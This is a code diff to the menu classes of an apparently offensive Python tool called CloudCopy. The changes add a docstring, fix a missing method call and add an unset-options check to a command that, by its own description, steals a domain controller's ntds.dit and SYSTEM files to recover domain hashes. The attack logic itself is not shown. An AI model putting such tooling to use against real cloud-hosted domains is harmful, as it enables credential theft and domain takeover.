@@ -111,8 +111,6 @@ class BaseCloudCopy(BaseCmdInterpreter, abc.ABC):
 
     @abc.abstractmethod
     def do_stealDCHashes(self, args):
-        """stealDCHashes
-        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""
         pass
 
     def stealExistingInstance(self):
@@ -141,7 +139,9 @@ class ProfileCloudCopy(BaseCloudCopy):
         self.options['victimProfile'] = ''
 
     def do_stealDCHashes(self, args):
-        if '' not in self.options.values:
+        """stealDCHashes
+        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""
+        if '' not in self.options.values():
             if self.options['instance_id'] != '':
                 self.cloudCopier = CloudCopyUtils({'type': 'profile', 'options': self.options}, 'attacker')
                 self.stealExistingInstance()
@@ -166,12 +166,17 @@ class ManualCloudCopy(BaseCloudCopy):
         self.options['victimSecretKey'] = ''
 
     def do_stealDCHashes(self, args):
-        if self.options['instance_id'] != '':
-            self.cloudCopier = CloudCopyUtils({'type': 'manual', 'options': self.options}, 'attacker')
-            self.stealExistingInstance()
+        """stealDCHashes
+        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""
+        if '' not in self.options.values():
+            if self.options['instance_id'] != '':
+                self.cloudCopier = CloudCopyUtils({'type': 'manual', 'options': self.options}, 'attacker')
+                self.stealExistingInstance()
+            else:
+                self.cloudCopier = CloudCopyUtils({'type': 'manual', 'options': self.options}, 'victim')
+                self.stealNewInstance()
         else:
-            self.cloudCopier = CloudCopyUtils({'type': 'manual', 'options': self.options}, 'victim')
-            self.stealNewInstance()
+            print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")
 
 class MainMenu(BaseCmdInterpreter):
 
